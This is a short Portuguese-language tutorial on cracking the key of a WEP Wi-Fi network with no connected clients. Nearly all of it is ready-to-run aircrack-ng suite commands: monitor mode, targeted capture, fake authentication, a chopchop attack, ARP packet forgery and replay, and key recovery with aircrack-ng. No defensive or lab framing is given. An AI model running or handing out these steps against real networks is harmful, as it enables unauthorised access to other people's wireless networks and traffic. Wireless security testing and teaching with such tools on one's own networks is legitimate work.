## Atacando WEP sem clientes conectados

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo

 ``` airodump-ng <interface> ```


#### 3° passo:

Focar o sniffing na rede alvo para capturar o trafego...

 ``` airodump-ng --bssid BSSID --channel CHANNEL <interface> -w CAPNAME ```

#### 4° passo:

Realizar uma Fake Auth no AP alvo para efetuarmos um ataque nesse fake client...

 ``` aireplay-ng -1 6000000 -a BSSIDAP <interface> -e ESSIDAP ```
 
 * ``` -1 6000000 ``` é referante a quantidade de pacotes de Fake Auth a serem enviados ao AP para o fake client não ser desconectado (keep alive).
 
* Depois de executar o comando repare se um novo cliente aparece conectado ao AP alvo.
 
#### 5° passo:

Após criarmos um fake client, temos que capturar algumas infos sobre a autenticação do WEP. Tem dois tipos de ataques: o ChopChop e um Ataque de Fragmentação... nem todos os roteadores são vulneraveis 
 
 ``` aireplay-ng -4 -a BSSIDAP -h BSSIDFAKECLIENT <interface> ```
 
* Depois de executar o comando é iniciado a catpura de pacotes e pode demorar um pouco. Logo depois sera pedido uma confirmação sobre os pacotes capturados ("Use this packet?"), é só digitar um "yes" e sera iniciado outro processo de criar um arquivo .xor que usaremos para forjar um pacote ARP... 

#### 6° passo:

Com o arquivo .xor vamos forjar os pacotes ARP

 ``` packetforge-ng -0 -a BSSIDAP -k 255.255.255.255 -l 255.255.255.255 -h BSSIDFAKECLIENT -y arquivo.xor -w output.cap```
 
 * ``` -k Destination IP ```
 * ``` -l Source IP ```
 
Depois de executar o comando sera criado um um arquivo "arp_request" que é o pacote ARP forjado qe usaremos

#### 7° passo:

Com o pacote ARP forjado vamos esse pacote enviar para o Fake Client...

 ``` aireplay-ng -2 -r arp_request <interface> ```
 
* Depois de começar o envio dos pacotes ARP forjados fique de olho no campo #Data que está no terminal do airodump. Este valor precisa ir até a faixa dos 20 mil dados (demora um pouco).


#### 8° passo:

Quebrar o WEP por brute force

 ``` aircrack-ng -a 1 arquivo.cap ```
